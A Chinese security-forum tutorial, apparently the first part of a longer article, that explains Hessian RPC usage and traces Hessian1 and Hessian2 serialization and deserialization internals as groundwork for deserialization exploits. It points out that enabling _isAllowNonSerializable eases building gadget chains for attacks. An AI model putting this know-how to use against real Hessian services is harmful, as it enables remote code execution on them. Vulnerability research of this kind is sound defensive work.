# 一文看懂Hessian反序列化漏洞
> QIANXIN Team
> 来源：https://forum.butian.net/share/4989

# Hessian反序列化

Hessian 协议是一种高效、**跨语言**的二进制 RPC（Remote Procedure Call，远程过程调用）协议。其基于 HTTP 协议，通常通过 Web 应用来提供服务，专为面向对象的传输而设计。目前发布了两代协议，分别是Hessian 1.0和Hessian 2.0，当然hessian2是作为hessian1的能力补充以及升级。后续也会基于这两个版本协议的序列化以及反序列化进行分析。

## 基本了解

这里来简单看看如何通过hessian协议实现远程过程调用。需要引入hessian的依赖：

```xml
<dependency>
            <groupId>com.caucho</groupId>
            <artifactId>hessian</artifactId>
            <version>4.0.66</version>
        </dependency>
```

### 基于Servlet项目

#### 基本使用

通过tomcat来搭建一个servlet项目即可，这里不多说。

先创建一个提供服务的接口类：

```java
package org.example;

public interface Greeting {
    String sayHello();
}
```

然后创建服务端的内容：

```java
package org.example;
import com.caucho.hessian.server.HessianServlet;

import javax.servlet.annotation.WebServlet;

@WebServlet("/hessian")
public class HessianTest extends HessianServlet implements Greeting{
    @Override
    public String sayHello() {
        return "I'm fupanc";
    }
}
```

因为这里继承了HessianServlet类并且因为我是基于maven搭建的项目，所以需要把maven项目拉取的hessian的jar包放在lib目录下（否则只会本地有相关依赖，但是项目生成的供tomcat服务器运行的war包没有对应依赖），如下操作即可很快捷方便提取jar包：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-4eac95f8233ab51b64dc0425a538d2d714d09633.png)

然后运行tomcat服务器即可：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-34b6951e0e33b1d14b4ca4b5f8c303b764fb47d1.png)

成功创建了一个hessian的服务端。

然后我们使用一个客户端来进行调用：

```java
package hessian;

import com.caucho.hessian.client.HessianProxyFactory;

public class Main {
    public static void main(String[] args) throws Exception {
        String url = "<http://localhost:8081/tomcat002_Web_exploded/hessian>";
        HessianProxyFactory hessianProxyFactory = new HessianProxyFactory();
        Greeting hello = (Greeting) hessianProxyFactory.create(Greeting.class, url);

        System.out.println(hello.sayHello());
    }
}
```

注意也要保证客户端这边有对应的接口类：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-be2144197189191dfb18c7cbc340535b064e1306.png)

运行成功输出方法调用的结果：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-217dbd8752403de32eab940460d614c0c73dadf9.png)

整体有点类似rmi的执行效果，但是具体过程后续再具体调试看看。

#### 通信过程分析

分别从服务端和客户端部分来调试一下整体的交互过程。

##### 客户端

主要分析如下代码：

```java
HessianProxyFactory hessianProxyFactory = new HessianProxyFactory();
        Greeting hello = (Greeting) hessianProxyFactory.create(Greeting.class, url);

        System.out.println(hello.sayHello());
```

其中hessianProxyFactory.create()就是创建了一个代理对象，并没有与服务端进行交互，仅一些赋值操作，并且代码较简单，这里不赘述。知道最后会返回一个HessianProxy的代理对象即可：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-98e42daa44b9f96be12f80ad303d9774c9e9dc92.png)

比较关键的就是后续代理对象调用方法部分，也就是**hello.sayHello()**，后续调用中，很明显会跳转到HessianProxy类的invoke()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-8c3fa81141fc0ede51879f9b093bf24b8c8c0cbc.png)

持续跟进，比较关键的就是如下代码：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-5d8337073d11995fa1c599f7fa335ab4c225e457.png)

这里的`_factory`变量的值在hessianProxyFactory.create()时就赋值了，也就是HessianProxyFactory类的一个默认初始化对象，而这里的isOverloadEnabled()返回的`_isOverloadEnabled`变量的默认值为false：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-d9375e029ea940b6b40c90fc03fac3649b4b71f9.png)  
故这里会把mangleName赋值为sayHello。继续跟进，到如下部分：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-9d9d2452b47925e13125222b1da896d2b3bdfffd.png)

其中非常关键的就是这个sendRequest()方法，从传入的参数来看，mangleName就是要调用的方法，args就是调用方法传入的参数，很容易看出来这个就是用于与客户端进行交互的函数。跟进sendRequest()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-103799bca6b4fab8a17aa696dd570e9e05b53cc9.png)

这里通过HessianProxyFactory类的getConnectionFactory()方法获取到一个用于HTTP请求的连接工厂类，也就是HessianURLConnectionFactory类，并调用了它的open()函数：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-1f5fb9931218ea0dc1d8ea5231547b43af92a681.png)  
这个open函数返回了一个连接到http服务端的“连接”，注意此时并没有发起网络连接，只有在调用 URLConnection.connect() 方法时才会建立。最后返回了一个HessianURLConnection的初始化对象：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-7774cf516fb6bf8c9fba934a3e535605da04e8b4.png)

回到sendRequest()函数：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-c92bc2364cb54ff781280f7caee898604f3746cc.png)

可以看出会通过`addRequestHeaders(conn)`方法设置请求头：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-9ef416b0083dec309c8822767d332c378e7d32f4.png)

可通过getBasicAuth()设置身份校验请求头内容。继续跟进：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-213b7f7c86e8a22f3531ab9442074ec7e5c1f049.png)

后续会通过调用getOutputStream()方法发起了tcp连接，并且构造http请求，这里也就是会把相关调用信息后hessian序列化后写入到输入流中作为与服务端进行交互的信息，通过call()方法把具体的调用写进去请求体中，最后通过`conn.sendRequest()`发送请求进行交互。值得关注的就是这里调用的HessianProxyFactory类的getHessianOutput()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-f19df12ff28b99a084284e1a7d5973df8ebb31b5.png)

这里的值默认情况为：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-92d409da191c19888d4a4b1a8f3465ca979d4b12.png)

也就是说默认情况下，发送request时是Hessian1序列化，同时这里会调用到setVersion()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-fbdb669d62d00636f5d4b1de1c3a7201f7d92ddf.png)

大致是希望返回的是hessian2序列化的数据，在后续真正往流里面写入相关方法调用信息时会涉及到这个`_version`变量的值用于交互。这里具体的hessian1和hessian2的序列化与反序列化过程暂时不分析。

故最后返回了一个HessianOutput实例化对象，并且后续调用了它的call()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-301a2d66b94b587f87c670a42740f13d9fc54480.png)

调用的startCall()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-22c9f629cef87b1f114876f8bf69a0e28e3455e7.png)  
控制了方法调用的标头内容。

最后发送完请求交互后，会获取服务端返回的内容：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-77a92c44ad1716078323c6f973c35b484f4214c4.png)

然后对返回的序列化数据进行判断：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-6a5345cbb07b533ae4895e03178bc11c8946dd55.png)

很容易看出来这里是先判断返回的hessian序列化数据是hessian1还是hessian2，也就是会读取返回的序列化数据中的标志位数据，这里跟进如下：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-fe740dc6ac00397f3abbcc4f7dc58d6bd29e4c34.png)

默认情况下就会这样走，标志位数据为72，也就是H的ascii码，可能是我们前面分析的往传输数据中写入的`_version`生效了，所以返回的是hessian2序列化的数据。

后续就是hessian2的反序列化操作，跟进关键的readReply()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-88bd53929f4009d46ee573989d3fe029c0decb3a.png)

读取了服务端方法调用后返回的数据（这里的反序列化过程暂时不跟进）。最后在HessianProxy类的invoke()方法返回了相关服务端方法调用的结果：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-5286175ffa4d872591767107f1d605db1560befc.png)

成功实现了rpc调用。

##### 服务端

直接在服务端的sayHello()方法部分打上断点开始调试，观察调用栈，比较关键如下：

```php
sayHello:10, HessianTest (org.example)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invoke:302, HessianSkeleton (com.caucho.hessian.server)
invoke:198, HessianSkeleton (com.caucho.hessian.server)
invoke:428, HessianServlet (com.caucho.hessian.server)
service:408, HessianServlet (com.caucho.hessian.server)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
```

这里我们是将hessian服务端设计成了一个servlet，所以正常调用过程也是会先进入到对应servelt类的service()方法，也就是HessianTest的父类HessianServlet的service()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-9e9a85d73947595bf52d400db8c883dc1a33cdc5.png)

只接受POST请求，然后持续跟进，直到调用HessianSkeleton#invoke()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-9e0168e4b6052b506228988b9d0b56b520c2211f.png)

很容易看出来这里就是做了一下兼容性，根据客户端的数据来判断在服务端是使用hessian1/hessian2来进行反序列化和序列化，跟进关键的readHeader()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-652f449a71fe99d6e46221dc1f44459b04d066de.png)

对应上了前面客户端序列化时的内容，先写入了c，然后写入了版本号，这里服务端也对应提取出来了，也就是后续服务端会使用hessian1反序列化，然后使用hessian2进行序列化：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-74b0107cc7e21bf03f7ede7705ce950ab1da4071.png)

后续调用的invoke()方法会进行反射调用服务端的HessianTest的sayHello()方法并写入到hessian2序列化的输入流中（至于这里的非常关键的`_service`参数传递情况，在对应servlet初始化时会进行设置，也就是HessianTest的父类HessianServlet类的init()方法，这都是初始化servlet必定会调用的方法，自行跟一下就行，这里不多说）：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-598c54e052d354fe7d179557fe9342fa9af2ea4b.png)

简单跟进一下这里的writeReply()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-92e9bc4015c03a0140a5b22d71b00243890bb7b4.png)

跟进一下这里的startReply()中调用的writeVersion()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-94fb4f338ba970465031ffa5b41734b1f940059e.png)

表示了服务端序列化使用的hessian版本相关信息，也对应上了前面分析客户端判断标志位为H并进行hessian2的反序列化操作。

并且最后在writeReply()方法中通过writeObject(o)方法把服务端对应方法调用的结果写入到序列化流。

自此完成了整个通信过程的分析。

### 封装调用

前面是结合servlet进行远程调用，还可以直接通过HessianOutput/HessianInput、Hessian2Output/Hessian2Input实现序列化和反序列化，从而自定义数据的传输或存储逻辑。随便写一个javabean类：

```java
package hessian;

import java.io.Serializable;
public class Cat implements Serializable{
    private String name = "catalina";
    private int age = 22;

    public Cat() { }

    public Cat(String name,int age) {
        this.name = name;
        this.age = age;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public int getAge() {
        return age;
    }
    public void setAge(int age) {
        this.age = age;
    }
}
```

然后进行序列化和反序列化：

```java
package hessian;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import java.io.*;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception {
        Cat cat = new Cat();

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.writeObject(cat);
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        System.out.println(hessianInput.readObject());
    }
}

```

运行可以看到在反序列化部分成功得到了一个Cat类实例。后续来详细跟进一下序列化与反序列化过程。

#### 序列化反序列化过程分析

这里的hessian1的序列化和反序列化部分就直接基于前面的代码进行调试分析了。

##### hessian1序列化

打断点于HessianOutput类初始化的地方，这里没什么好说的，都是初始化操作：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-7e763a8c1086476cf8c15ce44398cd300ee33591.png)

跟进关键的HessianOutput#writeObject()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-6b843acd0a49613cd148206d30ef543729703f86.png)

会创造一个序列化器然后进行序列化，这里先跟进SerializerFactory#getSerializer()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-e7361c5346d710d5c1a0f7c6a6920b892ee41940.png)

从代码逻辑可以看出，如果是第一次进行操作，会先创造对应的要序列化类的Class对象的“序列化器”，然后新建`_cachedSerializerMap`并以键值对形式存储，后续再次调用相关方法则会先查看缓存的serializer中是否有对应要序列化类的Class对象，有的话直接取出并返回，否则同样新建一个“序列化器”。当然我们这里是第一次运行，跟进这里关键的loadSerializer()方法，会进行一系列相关的获取序列化器的操作：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-aa5b8339cd991459810d21713ff602ee36f91391.png)

还有如果对应的类继承或实现了某些接口类也会直接返回对应的serializer，如下情况的class对象：

```php
HessianRemoteObject.class
BurlapRemoteObject.class
InetAddress.class
class对象或其父类等有writeReplace()方法
Map.class
Collection.class
是array class
Throwable.class
InputStream.class
Iterator.class
Calendar.class
Enumeration.class
Enum.class
Annotation.class
```

若都不存在则会调用getDefaultSerializer()方法来获取默认的Serializer：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-0410977ccfc12bd3b19f3c7cab327f2397a3a219.png)

跟进一下：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-a45c20340df6e76584a48a81a80d3ae99975f328.png)

这里比较关键的就图上两部分：

-   众所周知，java对象的序列化/反序列化（ObjectOutputStream等类）强要求对应类实现Serializable.class接口类，但是hessian反序列化时不需要对应Class对象实现Serializable.class即可实现反序列化（暂时不详细谈），而hessian序列化时是有要求的，也就是如上图，但是这里条件判断用的&&，需要满足前后两个条件，前一个条件中，如果对应类实现Serializable.class接口类，就会判定为false并且不再判断后面的条件，而后一个条件中的`_isAllowNonSerializable`变量值默认为false，取反也就会为true。正是因为**这里使用了&&并且`_isAllowNonSerializable`变量值是可以人为更改的，所以这里可以直接将`_isAllowNonSerializable`变量改为true，取反后为false，这样就算前面被判定为treu，后面还是为false，也就实现了可以序列化没有实现Serializable.class接口的类，非常方便和后面的hessian反序列化配合，这样就不再受限于Serializable.class条件，可以构造很多链子来打，具体看后面的漏洞利用部分。**
-   第二部分就是会通过UnsafeSerializer#create()方法创建“序列化器”，这里的getWriteReplace()方法就是判断对应Class对象及其父类有没有实现writeReplace()方法，没有即如图代码逻辑进行。

跟进UnsafeSerializer#create()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-bca3858f66734fab32cd19c4f796c9e2e61eda99.png)

同样先判断缓存的map中是否有serializer，没有的话就新建并以键值对形式写进去。跟进这里UnsafeSerializer类的实例化，直接值得一提的是它的static方法（也就是那个在实例化对象时优于构造函数执行的方法）：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-60c318d97ee17625ee73d36836d916a97cdfe3e4.png)

这里的`_unsafe`变量比较关键，被赋值为了一个Unsafe类实例，后续会用到。继续跟进UnsafeSerializer类实例化时调用的构造函数：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-96143b82e84e123025225ce743bb632f2d91031b.png)

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-5598158c1f2d64991d78018886e9d6826b9bcdd9.png)

这里获取了传入的Class对象的所有field，**跳过了TRANSIENT和static类型修饰的field**，也就是序列化时不会获取相关field的内容。后面将其他的field整合后赋值给了`_fields`变量，后面比较关键的是这里调用的getFieldSerializer()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-ffa4f6ad3681a6decc69de502a29018f662cb840.png)

会获取对应field的类型并找到对应的序列化器。以我这里的String类型的name变量为例：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-0afca33d6a4085a94a0513001f5ed45714875c96.png)

会初始化StringFieldSerializer类：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-f0428b569c89014e301837dcfdf4014f88ea64d5.png)

这里获取了对应field的偏移值，为后面获取对应field的值做准备。同样的其他类型对应内部类的初始化代码也是一样的，比如int类型的：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-b8fefa811014a99ea431259102d5db257a677d30.png)

最后实例化完UnsafeSerializer类后会被作为后续的”序列化器“用于序列化类对象：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-c4de1abfd90988561f60017cfeb030b66411456b.png)

跟进对应的writeObject()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-41938a43bae7340096395845983450826c621cfa.png)

跟进这里的writeObjectBegin()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-f0901e1d070e40c7fb28c4cb07c4cd3db46f2044.png)

会返回-2，同时这里会调用writeMapBegin()：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-480cf8f9e4474a760ef8394fa4f3349391f42b0c.png)

这里写入了一些标志位信息。回到writeObject()方法，因为返回了-2，故这里会调用writeObject10()方法进行序列化：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-57a8747a7e75dc71dbb3bb441ff7dd70a8232d70.png)

这里会对先前初始化UnsafeSerializer类时已赋值的变量进行操作，也就是获取要序列化类的field的值：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-0c309e25361a6aa7b7eb050230ed06c1fe7e2c7d.png)

符合前面的分析，再跟进这里会调用的对应内部类StringFieldSerializer以及IntFieldSerializer的serialize()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-e0d2f06f7ed2f34ca57e438ad9e3acb0b5e23c7f.png)

通过field的偏移值获取到了对应实例化对象的值并写入到序列化的流中。

最后在writeObject10()中调用writeMapEnd()方法写入结束标志位数据：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-b306ee2d17699318920353c11c77145b19784414.png)

至此完成整个序列化的实现以及分析。

##### hessian1反序列化

同样的HessianInput类的初始化操作：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-1d424abe4b90f4691746e2555632231d3de4b869.png)

跟进其readObject()方法：

获取标志位数据：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-5f70db9c69fce4489ff457527625a6387dd9bd6f.png)

这里的type像是要反序列化的类的软件包名以及类名，当然在序列化时也写入了，前面也有对应的图，同时这里通过readType()方法读取出来了。跟进SerializerFactory类的readMap()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-00b86fcccff087843b3e3c56626501d34448eb30.png)

跟进这里的getDeserializer()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-f9e4c3d9ae8dcbba1a5bee2d7825c9b33f8a59ae.png)

获取“反序列化类”的操作，和之前一样，看是否给`_cachedTypeDeserializerMap`变量赋值了，以及是否存在对应type的键值对，否则就是创建一个新的“反序列化类”，跟进关键的loadSerializedClass()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-cd5391b9365a4a878db8c487fc23b9260e857812.png)

这里会调用ClassFactory类的load()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-e07e8346a1976cbc33f154261aff33987cdfdc03.png)

一个加载Class对象的操作，但是这里有对反序列化的类有限制，跟进isAllow()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-1ad62352eeeaee0d9ad9d5a85db39bf910264804.png)

默认情况下`_allowList`为空，而`_staticDenyList`变量会在static方法中设置：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-d9c97752166c82f88e06e4517ed222300f1bcc99.png)

能看出ClassFactory类的static方法设置了黑白名单。故因为`_allowList`为空，而这里反序列化的类又不在黑名单中，故直接返回了true允许反序列化。由此通过ClassFactory类的load()方法获取到了Cat类的Class对象：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-fe28690c775eafe45a5d10364e8f4dbbb4162282.png)

再跟进这里的getDeserialize()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-19a937b19b5a407e22a2794bd670eeeb75980f6a.png)

熟悉的操作，继续跟进这里的loadDeserializer()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-dfd04e934271f8b365215af66ca6f992095cb980.png)

和前面序列化的loadSerializer()方法操作一样，会尝试获取“反序列化类”，最后会调用getDefaultDeserializer()方法来获取默认的“反序列化类”：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-65638775b207dc2ba56efb4d59b0bee543a7a4e3.png)

简单提一下这里的`_isEnableUnsafeSerializer`变量，其实序列化和反序列化很多地方都会用到，变量定义为：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-81422937d4af76aa5e9847035151293fef205aee.png)

两个类的方法都是：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-65aea3fcbea03672f5415eedca3de2734313f5fc.png)

其中涉及到的`_isEnabled`变量都是在UnsafeSerializer和UnsafeDeserializer的static方法中有体现，UnsafeDeserializer类的static方法（前面序列化部分贴过UnsafeSerializer的）：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-ac52f35135ba26651372ce39765f93fc440212c1.png)

和UnsafeSerializer类的static方法逻辑一样，只要能成功反射获取到Unsafe类实例，默认情况下这里的`_isEnabled`就是true，也就是默认情况下SerializerFactory类的`_isEnableUnsafeSerializer`变量就是true。

回到getDefaultDeserializer()方法，后面会实例化UnsafeDeserializer类：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-f22bfad33d16312acfa2e8276976c2cd4f8ea299.png)

跟进getFieldMap()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-4ce463d69ad2b78908a18dd23ce1c443987166bc.png)

很容易看懂的逻辑，反射获取Class对象的field，过滤了Transient和Static修饰的变量并进行去重，然后使用了一个HashMap以键值对存储field及对应的“反序列化类”，跟进关键的FieldDeserializer2FactoryUnsafe类的create()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-8d1753c0a6522b3e96707e4847966f941eb40a3d.png)

非常熟悉的操作，实例化StringFieldDeserializer类部分同样获取偏移值：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-c667217bb958bb33cb6f7da828c8983e2106ac40.png)

最后效果如下：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-ff1b21ded099c9291b55f72e7a8f519f846dd8c9.png)

回到UnsafeDeserializer类的构造函数：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-186e7cd24e2879253fbc2ca9141995e8ec2df63a.png)

调用的getReadResolve()方法就是尝试获取Class对象的readResolve()方法，这里的Cat测试类并没有实现。最后成功获取到了一个“反序列化”类：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-d13d78df23b50a75b922ed2d46e672733ff32d91.png)

然后会调用UnsafeDeserializer类的readMap()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-de1d0cf41b1e3e3a45a0c6e1e3fa56d4f9e579e3.png)

跟进instantiate()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-6ed722b66c18c443fc681d3c930db74dcb737537.png)

会调用Unsafe类的allocateInstance()方法，起到了用于获取对应Class的实例化对象的作用。继续跟进：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-d0ae90fb17496bb17f4c236de481fca29d99de8b.png)

注意此时的Cat对象中的值还没有赋，跟进调用的另一个重载的readMap()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-02bbdfc245cdccfa4a1985328f9b56dee93c1167.png)

很容易看出来通过readObject()方法从流里面读取field信息：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-4401c71a94d9b139f3f709669dd268f8334fb4f4.png)

从标志位后开始读。

然后回到readMap()方法，后续就会从前面的HashMap中取出对应的“反序列化类”并调用它的deserialize()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-81524636841ec2842adf1dd2e573bdd9b7d4bcef.png)

简单看一下这里的readString()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-6d55beec4547ecf6d024667394a5473dbef4177a.png)

同样是读取标志位后的数据，贴一下前面序列化拿到的数据：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-31dea07dc13b806abaa129a5a2b1950b831d1663.png)

和前面反序列化取数据的过程对比一下理解就行，先取S标志位后的field，然后再取S标志位后的field对应的值。

获取到值后，再通过Unsafe类的putObject传入偏移值用于给Cat对象的变量赋值。

age变量的deserialize方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-e410c1a7c57eb5f1386553a02789d44f5ead0223.png)

大差不差。

回到UnsafeDeserializer类的readMap()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-ac332d75d691a82a9b90739f6a255bc297e106c1.png)

readMapEnd()进行数据检查：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-bec820e9e507d140c039ea4ce4f7a96a3a25dba6.png)

及对应的resolve()方法：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-e94189ff7bbd74747626a280ea9f82968689af7d.png)

随后一直return，成功反序列化获取到对应的类对象：

![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-47f73200094e113d8c38c91571c242c1717164ed.png)

————————————

##### hessian2序列化

简单修改序列化和反序列化代码为：

```java
package hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.*;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception {
        Cat cat = new Cat();

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.writeObject(cat);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));




    }
}
```

初始化Hessian2Output类部分就不说了，跟进调用的writeObject()方法：

![image-20260709191204592](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709191204592.png)

同样的获取serializer后调用writeObject()方法进行序列化，这里的findSerializerFactory()即返回了一个默认情况初始化的SerializerFactory类实例，没什么特别的处理，跟进调用的SerializerFactory#getObjectSerializer()方法：

![image-20260709191826473](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709191826473.png)

看了一下这里的getSerializer()方法过程和前面hessian1序列化过程基本一模一样，自行跟一遍即可：

![image-20260709192904141](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709192904141.png)

再跟进这里调用的UnsafeSerializer#writeObject()方法：

![image-20260709193414899](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709193414899.png)

会调用Hessian2Output#writeObjectBegin()方法：

![image-20260709193506937](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709193506937.png)

这里写入的标志位数据是C，Hessian1是M，并且返回值为-1，所以后续调用的是如下这块：

![image-20260709193637058](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709193637058.png)

writeDefinition20()方法会写入field的个数及对应field名字：

![image-20260709194000718](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709194000718.png)

再后面的writeInstance()方法则会调用对应field的“序列化类”进行序列化：

![image-20260709194218149](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709194218149.png)

情况和之前一样，name变量：

![image-20260709194237807](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709194237807.png)

age变量：

